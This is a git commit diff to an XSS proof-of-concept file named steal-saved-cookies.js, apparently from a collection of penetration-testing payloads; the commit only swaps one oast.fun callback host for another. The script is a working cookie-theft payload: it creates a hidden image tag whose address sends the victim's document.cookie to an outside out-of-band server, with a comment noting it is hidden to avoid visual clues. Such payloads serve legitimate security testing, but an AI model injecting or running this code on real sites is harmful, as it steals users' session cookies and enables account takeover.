f5f2f0d4325defce03c8b880a44c3ff49e43ce17
Roberto Nunes <46332131+Akokonunes@users.noreply.github.com>
2024-12-24 09:10:38 +0900

    Update steal-saved-cookies.js

--- poc/XSS/steal-saved-cookies.js
+++ poc/XSS/steal-saved-cookies.js
@@ -1,7 +1,7 @@
 // Dynamically create an <img> tag to exfiltrate cookies
 (function stealCookies() {
   var img = document.createElement("img");
-  img.src = `https://hqwkfozbqejnjncfqouaju7a9oghr07ei.oast.fun/${encodeURIComponent(document.cookie)}`;
+  img.src = `http://mpvzdbjbftridrbbwcgldrt5uz4w11nqg.oast.fun/${encodeURIComponent(document.cookie)}`;
   img.style.display = "none"; // Hide the image to avoid visual clues
   document.body.appendChild(img);
 })();
